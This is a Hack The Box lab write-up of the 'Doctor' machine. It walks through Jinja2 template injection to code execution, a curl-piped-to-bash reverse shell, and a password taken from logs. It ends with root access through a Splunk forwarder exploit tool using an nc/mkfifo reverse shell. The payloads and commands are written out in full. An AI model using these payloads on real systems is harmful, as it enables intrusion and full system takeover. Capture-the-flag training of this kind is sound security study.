---
layout: post
title: HTB Doctor Writeup  
subtitle: Easy Box
thumbnail-img: /assets/img/doctor/doctor.png
tags: [HTB]
---

# Notes
![Doctor](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/doctor/doctor.png)


| Name | Explore |
| :------ |:--- |
| OS | Linux |
| RELEASE DATE | 26 Sept 2020 |
| DIFFICULTY | Easy |

# Port Scan

IP: 10.10.10.209

We have 3 open ports on this machine 22, 80, and 8089. Port 22 is most likely ssh and 80 is probably a http server, but I was unsure what 8089 was. I did a google search "Splunk 8089" and the first result was a community article saying that it was a remote management port for a forwarder.

```
PORT     STATE SERVICE  VERSION      
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                       
|   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA)
|   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA)                                                                                              
|_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Doctor          
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
8089/tcp open  ssl/http Splunkd httpd
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS 
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-09-06T15:57:27 
| Not valid after:  2023-09-06T15:57:27 
| MD5:   db23 4e5c 546d 8895 0f5f 8f42 5e90 6787
|_SHA-1: 7ec9 1bb7 343f f7f6 bdd7 d015 d720 6f6f 19e2 098b
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: splunkd
|_http-server-header: Splunkd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# HTTP 80

Because I didn't have any credentials for the splunk remote administration I started with the webserver.

Right off the bat, it reveals `doctors.htb` so I'll add it to my `/etc/hosts` file.

![Doctor](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/doctor/03e7adc1cec543bc9dc1c251a1eaa588.png)

Going to `http://doctors.htb` brings to me a login page, we don't have any credentials so I'll sign up.

![Doctor](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/doctor/5ebec3d9f0f747139526b97da7719dce.png)


Once we sign in there are two things we can do. Edit our account or make a new message. I made a new message and it came up on the home page of `http://doctors.htb/home`!

![Doctor](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/doctor/02a1f864ac3e418fa9b3b6e1667775e4.png)

![Doctor](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/doctor/2c36e76861bf40e18afbc767c4355c83.png)


I tried a few different types of payloads like XSS and SSTI but none were quite working out of the box. I then looked at the source code `view-source:http://doctors.htb/home` and saw this on line 28

```
             <a class="nav-item nav-link" href="/home">Home</a>
              <!--archive still under beta testing<a class="nav-item nav-link" href="/archive">Archive</a>-->
            </div>
            <!-- Navbar Right Side -->
            <div class="navbar-nav">
```

I then went to `/archive` and I saw that my SSTI test did work! 

![Doctor](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/doctor/1b2cff28ed5342afb9624d4164b822e0.png)


I then went through [This](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) testing chart to figure out what engine is behind this template. It looks like its either Jinja2 or Twig because we got the 7's

![Doctor](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/doctor/ed4f9823f3384e8b9bccf412ebcb62c3.png)

![Doctor](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/doctor/f17b668dc8504c7082c2eda6b6dc920b.png)

Now that we have a valid SSTI vulnerability and have a general idea what engine it is running we can now try and get a reverse shell. In that same repo there is a section titled "Jinja2 - Remote Code Execution" with a test payload `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}`. That will try and run the `id` command and return the results. I'll put that into the title field and open up `/archive` and see if it got executed.

![Doctor](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/doctor/61c32c239f0b455b9e68a2327b4c3b26.png)


It did!

![Doctor](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/doctor/f85c64c71a63455890ccd9630d2cfc9c.png)


Next, we can get a reverse shell by doing a curl bash.

I'll first make a reverse shell payload

```
#!/bin/bash
bash -i >& /dev/tcp/KALIIP/4242 0>&1
```

Then I will set up a reverse shell listener

```
nc -lvnp 4242
```

Next, I will spin up a python webserver to host the reverser shell payload.

```
python3 -m http.server 80
```

Then I will edit the payload to curl bash our reverse shell

```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('curl KALI_IP/shell.sh |bash').read() }}
```

Then once we go to `/archive` we will get our shell!

```
┌──(kali㉿kali)-[~/htb/doctor]                                                                                                                               
└─$ nc -lvnp 4242                                                                                                                                            
listening on [any] 4242 ...                                                                                                                                  
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.209] 55620                                                                                                 
bash: cannot set terminal process group (824): Inappropriate ioctl for device                                                                                
bash: no job control in this shell                                                                                                                           
web@doctor:~$
```

# Shaun

I did some basic user enumeration on our web user. Running `groups` showed that I am a part of `adm`. This group will allow us to read log files. Often times this is a good place to find passwords.

```
web@doctor:/home/shaun$ groups
groups
web adm
```

There are lots of logs inside `/var/log` so we can use `grep` to search all of them for us

We can see a password of `Guitar123` for shaun.

```
web@doctor:/var/log$ grep -R -e 'password' /var/log/
grep -R -e 'password' /var/log/                                               
grep: /var/log/boot.log.2: Permission denied          
/var/log/auth.log:Mar 22 18:15:44 doctor VGAuth[664]: vmtoolsd: Username and password successfully validated for 'root'.
/var/log/auth.log:Mar 22 18:15:44 doctor VGAuth[664]: vmtoolsd: Username and password successfully validated for 'root'.
/var/log/auth.log:Mar 22 18:15:49 doctor VGAuth[664]: vmtoolsd: Username and password successfully validated for 'root'.
/var/log/auth.log:Mar 22 18:15:50 doctor VGAuth[664]: vmtoolsd: Username and password successfully validated for 'root'.
/var/log/auth.log:Mar 22 18:15:51 doctor VGAuth[664]: vmtoolsd: Username and password successfully validated for 'root'.
/var/log/auth.log:Mar 22 18:15:59 doctor VGAuth[664]: message repeated 18 times: [ vmtoolsd: Username and password successfully validated for 'root'.]
grep: /var/log/boot.log.4: Permission denied             
grep: /var/log/speech-dispatcher: Permission denied
grep: /var/log/vmware-network.4.log: Permission denied
/var/log/auth.log.1:Sep 22 13:01:23 doctor sshd[1704]: Failed password for invalid user shaun from 10.10.14.2 port 40896 ssh2
/var/log/auth.log.1:Sep 22 13:01:28 doctor sshd[1704]: Failed password for invalid user shaun from 10.10.14.2 port 40896 ssh2
/var/log/auth.log.1:Mar 22 18:15:44 doctor VGAuth[664]: vmtoolsd: Username and password successfully validated for 'root'.
grep: /var/log/vmware-network.9.log: Permission denied
grep: /var/log/vmware-network.1.log: Permission denied
/var/log/apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
```

We can now switch to the shaun user and upgrade the shell using python3

```
web@doctor:/var/log$ su shaun   
su shaun    
Password: Guitar123  

whoami                                 
shaun 

python3 -c 'import pty; pty.spawn("/bin/bash")'
shaun@doctor:/var/log$ 
```

# Root

Back when we did the nmap scan port 8089 was open. Lets dig into what it is doing a little bit more. Looks like this is a splunk forwarder.

```
shaun@doctor:/var/log$ ps -aux | grep splunk
ps -aux | grep splunk
root        1134  0.0  2.3 265920 93340 ?        Sl   18:15   0:06 splunkd -p 8089 start
root        1136  0.0  0.3  77664 15736 ?        Ss   18:15   0:00 [splunkd pid=1134] splunkd -p 8089 start [process-runner]
root        2310  0.0  0.0   2608   604 ?        S    19:42   0:00 /bin/sh /opt/splunkforwarder/etc/apps/_PWN_APP_/bin/pwn.bat
shaun       2459  0.0  0.0  17668   732 pts/0    S+   20:35   0:00 grep --color=auto splunk
```

The first thing that came up when googling `Splunk Forwarder exploit` was a github page titled [SplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2). Because the forwarder is running as root we might be able to priv esc using this repo. Reading the documentation we can try and interact with it.

```
┌──(kali㉿kali)-[~/htb/doctor]
└─$ git clone https://github.com/cnotin/SplunkWhisperer2
Cloning into 'SplunkWhisperer2'...
remote: Enumerating objects: 60, done.
remote: Counting objects: 100% (6/6), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 60 (delta 0), reused 0 (delta 0), pack-reused 54
Receiving objects: 100% (60/60), 22.00 KiB | 285.00 KiB/s, done.
Resolving deltas: 100% (19/19), done.
                                                                                                                                                             
┌──(kali㉿kali)-[~/htb/doctor]
└─$ cd SplunkWhisperer2/PySplunkWhisperer2 
                                                                                                                                                             
┌──(kali㉿kali)-[~/htb/doctor/SplunkWhisperer2/PySplunkWhisperer2]
└─$ python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.10 --username shaun --password Guitar123 --payload id
Running in remote mode (Remote Code Execution)
[.] Authenticating...
[+] Authenticated
[.] Creating malicious app bundle...
[+] Created malicious app bundle in: /tmp/tmp9mly5ddz.tar
[+] Started HTTP server for remote mode
[.] Installing app from: http://10.10.14.10:8181/
10.10.10.209 - - [22/Mar/2022 18:34:23] "GET / HTTP/1.1" 200 -
[+] App installed, your code should be running now!

Press RETURN to cleanup

[.] Removing app...
[+] App removed
[+] Stopped HTTP server
Bye!

```

It looks like this worked. I then tried a reverse shell. And we got one!

```
┌──(kali㉿kali)-[~/htb/doctor/SplunkWhisperer2/PySplunkWhisperer2]
└─$ python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --username shaun --password Guitar123 --lhost 10.10.14.10 --payload 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.10 4444 >/tmp/f'                                                                           
Running in remote mode (Remote Code Execution)
[.] Authenticating...
[+] Authenticated
[.] Creating malicious app bundle...
[+] Created malicious app bundle in: /tmp/tmpcxma8e8o.tar
[+] Started HTTP server for remote mode
[.] Installing app from: http://10.10.14.10:8181/
10.10.10.209 - - [22/Mar/2022 18:35:26] "GET / HTTP/1.1" 200 -
[+] App installed, your code should be running now!

Press RETURN to cleanup

─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
┌──(kali㉿kali)-[~/htb/doctor]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.209] 52922
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```
